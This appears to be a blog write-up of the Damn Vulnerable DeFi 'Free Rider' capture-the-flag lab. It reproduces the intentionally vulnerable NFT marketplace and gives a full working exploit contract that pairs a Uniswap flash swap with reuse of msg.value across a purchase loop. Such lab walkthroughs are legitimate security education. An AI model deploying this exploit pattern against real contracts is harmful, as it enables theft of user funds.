# Damn Vulnerable Defi 10: Free Rider

What a different task to the first 4. Here we have a simple NFT Marketplace, NFTs, Uniswap Protocol and a Buyer that is giving us the task to get all the nfts out of the Marketplace, because there is a vulnerability that he cannot exploit himself. I see two main tasks here: 1) understanding the code 2) finding the vulnerability. This seems to be a reappearing pattern, where task 1) needs more and more time, the more complex the contracts get.

## The Task Intro

A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.

You want to build some rep with this buyer, so you've agreed with the plan.

Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant.

## The Task Code

The test setup in javascript is very long and uses uniswap, that I had first to understand a bit to get the idea behind that task.

```apache
// Get compiled Uniswap v2 data
const pairJson = require('@uniswap/v2-core/build/UniswapV2Pair.json');
const factoryJson = require('@uniswap/v2-core/build/UniswapV2Factory.json');
const routerJson = require('@uniswap/v2-periphery/build/UniswapV2Router02.json');

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Free Rider', function () {
  let deployer, attacker, buyer;

  //1. The NFT marketplace will have 6 tokens, at 15 ETH each
  const NFT_PRICE = ethers.utils.parseEther('15');
  const AMOUNT_OF_NFTS = 6;
  const MARKETPLACE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('90');

  //2. The buyer will offer 45 ETH as payout for the job
  const BUYER_PAYOUT = ethers.utils.parseEther('45');

  //3. Initial reserves for the Uniswap v2 pool
  const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('15000');
  const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('9000');

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker, buyer] = await ethers.getSigners();

    //4. Attacker starts with little ETH balance
    await ethers.provider.send('hardhat_setBalance', [
      attacker.address,
      '0x6f05b59d3b20000', // 0.5 ETH
    ]);

    //5. Deploy WETH contract
    this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

    //6. Deploy token to be traded against WETH in Uniswap v2
    this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

    //7. Deploy Uniswap Factory and Router
    this.uniswapFactory = await new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer).deploy(
      ethers.constants.AddressZero // _feeToSetter
    );

    this.uniswapRouter = await new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer).deploy(
      this.uniswapFactory.address,
      this.weth.address
    );

    //8. Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
    // Note that the function takes care of deploying the pair automatically
    await this.token.approve(this.uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE);
    await this.uniswapRouter.addLiquidityETH(
      this.token.address, // token to be traded against WETH
      UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
      0, // amountTokenMin
      0, // amountETHMin
      deployer.address, // to
      (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
      { value: UNISWAP_INITIAL_WETH_RESERVE }
    );

    //9. Get a reference to the created Uniswap pair
    const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
    this.uniswapPair = await UniswapPairFactory.attach(
      await this.uniswapFactory.getPair(this.token.address, this.weth.address)
    );
    expect(await this.uniswapPair.token0()).to.eq(this.weth.address);
    expect(await this.uniswapPair.token1()).to.eq(this.token.address);
    expect(await this.uniswapPair.balanceOf(deployer.address)).to.be.gt('0');
    console.log('WETH/Token balance:');
    console.log(ethers.utils.formatUnits(await this.uniswapPair.balanceOf(deployer.address)));

    //10. Deploy the marketplace and get the associated ERC721 token
    // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
    this.marketplace = await (
      await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)
    ).deploy(AMOUNT_OF_NFTS, { value: MARKETPLACE_INITIAL_ETH_BALANCE });

    //11. Deploy NFT contract
    const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
    this.nft = await DamnValuableNFTFactory.attach(await this.marketplace.token());

    //12. Ensure deployer owns all minted NFTs and approve the marketplace to trade them
    for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
      expect(await this.nft.ownerOf(id)).to.be.eq(deployer.address);
    }
    await this.nft.setApprovalForAll(this.marketplace.address, true);

    //13 Open offers in the marketplace
    await this.marketplace.offerMany(
      [0, 1, 2, 3, 4, 5],
      [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
    );
    expect(await this.marketplace.amountOfOffers()).to.be.eq('6');

    //14. Deploy buyer's contract, adding the attacker as the partner
    this.buyerContract = await (
      await ethers.getContractFactory('FreeRiderBuyer', buyer)
    ).deploy(
      attacker.address, // partner
      this.nft.address,
      { value: BUYER_PAYOUT }
    );
  });

  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const Crack = await ethers.getContractFactory('CrackFreeRider', attacker);
    this.crack = await Crack.deploy(
      this.uniswapFactory.address,
      this.weth.address,
      this.token.address,
      this.marketplace.address,
      this.buyerContract.address,
      {
        value: ethers.utils.parseEther('0.3'),
      }
    );
    console.log('balance of attacker BEFORE the attack is:');
    console.log(ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address)));

    await this.crack.attack();
    console.log('balance of attacker AFTER the attack is:');
    console.log(ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address)));
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // Attacker must have earned all ETH from the payout
    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
    expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.eq('0');

    // The buyer extracts all NFTs from its associated contract
    for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
      await this.nft.connect(buyer).transferFrom(this.buyerContract.address, buyer.address, tokenId);
      expect(await this.nft.ownerOf(tokenId)).to.be.eq(buyer.address);
    }

    // Exchange must have lost NFTs and ETH
    expect(await this.marketplace.amountOfOffers()).to.be.eq('0');
    expect(await ethers.provider.getBalance(this.marketplace.address)).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
  });
});

```

The NFT Market

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Uniswap.sol";
import "hardhat/console.sol";
import "./FreeRiderBuyer.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for (uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(msg.sender == token.ownerOf(tokenId), "Account offering must be the owner");

        require(token.getApproved(tokenId) == address(this) || token.isApprovedForAll(msg.sender, address(this)), "Account offering must have approved transfer");

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough"); // I can buy with the price of one all nfts

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}
```

```apache
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override nonReentrant returns (bytes4) {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));

        received++;
        if (received == 6) {
            payable(partner).sendValue(JOB_PAYOUT);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}

```

## The Solution

Alright! This was tough. First there is much more code to read and of course to understand.

First there was the marketplace, that looked very innocent with about 80 lines of code. Specalty here was a offer/buy many function with corresponding private \_offer/\_buy One functions. For me nothing special and I could not see the vulnerability immediately. After reading it for the 10th time I read a hint that msg.value in loops remain the same. And AHA. That is the key, here we can get with 15 ETH, the price of one NFT get all 5 remaining NFTs. Thats the vulnerability.

But then hey - the attacker account has only 0.5EHT, where to get the 15 ETHs back??? I first checked all the code again for another vulnerability, but did not find any.

During reading all the code files, which is a very iterative process, I was wondering what Uniswap was doing there - especally the value pair WETH DamnValueToken. There was a router, a factory, as well a ETH reserve. Additionally there was no source code available, for the pair, factory and router, but links to uniswap json file, that contain not only json but as well bytecode.

So I was really lost here, but again, that was very motivating to solve this puzzle. I went through quite some uniswap docus, watched some videos about flashloans and flash swaps to finally understand that I can get a flash loan from uniswap.

So the solution was to call a new smart contract that:

1. gets a flash loan from uniswap in the height of 15 or 16
2. Change WETH to ETH
3. in the same transaction buys all 6 nfts for the price of one
4. transfer these 6 nfts to the buyerContract with the safeTransferFrom function
5. Change the ETH to WETH
6. Pay back the flash loan with interest

HURRA! We have our ETH on the attackers address.

This was for me the first realistic challenge I did, with a lot of educational background, with my knowledge only solvable with a lot of background reading. 🎉️

For the security month this is the last exercise I publish and this concludes the security month publications to Github.

```apache
interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract CrackFreeRider is IUniswapV2Callee {
    //based on defi by example https://github.com/stakewithus/defi-by-example/blob/main/contracts/TestUniswapFlashSwap.sol
    address private damnToken;
    address private weth;
    address private factory;
    FreeRiderNFTMarketplace private marketplace;
    FreeRiderBuyer private buyer;

    constructor(address _factory, address _weth, address _damnToken, FreeRiderNFTMarketplace _marketplace, FreeRiderBuyer _buyer) payable {
        factory = _factory;
        weth = _weth;
        damnToken = _damnToken;
        marketplace = _marketplace;
        buyer = _buyer;
    }

    event Log(string message, uint val);

    function attack() external {
        uint amount = 16 * 10 ** 18; //the amount to buy one NFT
        address pair = IUniswapV2Factory(factory).getPair(damnToken, weth);
        require(pair != address(0), "!pair");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint amount0Out = weth == token0 ? amount : 0;
        uint amount1Out = weth == token1 ? amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(weth, amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    // called by pair contract
    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

        // about 0.3%
        uint fee = ((amount * 3) / 997) + 1;
        uint amountToRepay = amount + fee;

        //LOG
        console.log("amount", amount);
        console.log("amount0", _amount0);
        console.log("amount1", _amount1);
        console.log("fee", fee);
        console.log("amount to repay", amountToRepay);

        //change weth to eth
        IWETH9(tokenBorrow).withdraw(16 * 10 ** 18);

        //Here I do my exploit.
        uint[] memory tokenIds = new uint[](6);
        for (uint256 i; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: 15 * 10 ** 18}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            marketplace.token().safeTransferFrom(address(this), address(buyer), i);
        }

        //change eth to weth
        IWETH9(tokenBorrow).deposit{value: amountToRepay}();

        //repay
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    receive() external payable {}

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

```apache
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const Crack = await ethers.getContractFactory('CrackFreeRider', attacker);
    this.crack = await Crack.deploy(
      this.uniswapFactory.address,
      this.weth.address,
      this.token.address,
      this.marketplace.address,
      this.buyerContract.address,
      {
        value: ethers.utils.parseEther('0.3'),
      }
    );
    console.log('balance of attacker BEFORE the attack is:');
    console.log(ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address)));

    await this.crack.attack();
    console.log('balance of attacker AFTER the attack is:');
    console.log(ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address)));
  });
```

!
